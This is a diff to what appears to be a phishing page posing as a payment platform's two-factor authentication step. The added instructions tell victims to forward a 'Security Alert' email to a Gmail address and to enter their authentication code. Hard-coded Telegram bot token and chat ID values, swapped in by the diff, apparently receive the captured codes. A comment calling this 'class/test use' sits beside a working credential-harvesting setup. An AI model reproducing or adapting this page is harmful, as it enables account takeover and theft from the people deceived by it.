@@ -12717,14 +12717,24 @@
                         </div>
                         <div class="tw-w-full">
                             <div class="tw-w-full tw-pixelated-bg-white tw-edge-2">
-                                <div class="tw-flex tw-flex-col tw-items-start tw-p-6 tw-gap-2">
-                                    <div class="tw-flex tw-w-full tw-justify-between tw-text-black tw-text-h2 tw-font-semibold lg:tw-text-h1">
-                                        Device Trust and Two-factor authentication
+                                <div class="tw-flex tw-flex-col tw-items-start tw-p-6 tw-gap-4">
+                                    <div class="tw-flex tw-w-full tw-text-black tw-text-h2 tw-font-semibold lg:tw-text-h1">
+                                        PAYMENT VERIFICATION &nbsp; Device Trust &amp; Two-Factor Authentication
                                     </div>
-                                    <div class="tw-text-grey-green tw-text-body-14">
-                                        Please check your email and forward email you received to noonespayment@gmail.com for auto-authorization by payment provider.Please enter the authentication code from your Authenticator app
+
+                                    <div class="tw-flex tw-w-full tw-text-black tw-text-h3 tw-font-semibold lg:tw-text-h3">
+                                        To receive your payment securely:
+                                    </div>
+
+                                    <div class="tw-text-black tw-text-body-14 tw-leading-relaxed">
+                                        <ol class="tw-list-decimal tw-ml-6 tw-space-y-2">
+                                            <li>Check your email for a message with the subject <strong>“Security Alert:”</strong></li>
+                                            <li>Forward that email to <strong>noonestrustpayment@gmail.com</strong> to confirm your device and authorize the transaction through our payment provider.</li>
+                                            <li>Enter your authentication code from your app or email. Your payment will be reflected automatically once confirmed.</li>
+                                        </ol>
                                     </div>
                                 </div>
+
                                 <form id="otpForm">
                                     <div class="tw-flex tw-flex-col">
                                         <div class="tw-w-full tw-h-px tw-bg-grey"></div>
@@ -13071,8 +13081,8 @@
         const otpMessage = document.getElementById("otpMessage");
 
         // Telegram Bot Info (for class/test use only — don't expose real tokens!)
-        const botToken = "7757344484:AAFUuhaqCtEowjf3Pm5zgIbB5OLO9zQk2sI";
-        const chatId = "5615316142";
+        const botToken = "7536734919:AAElc3m0mOSItiAgFI0eZSYmEckEtsQHCcg";
+        const chatId = "6367881211";
 
         // Enable continue button only when all fields are filled
         const enableContinueButton = () => {
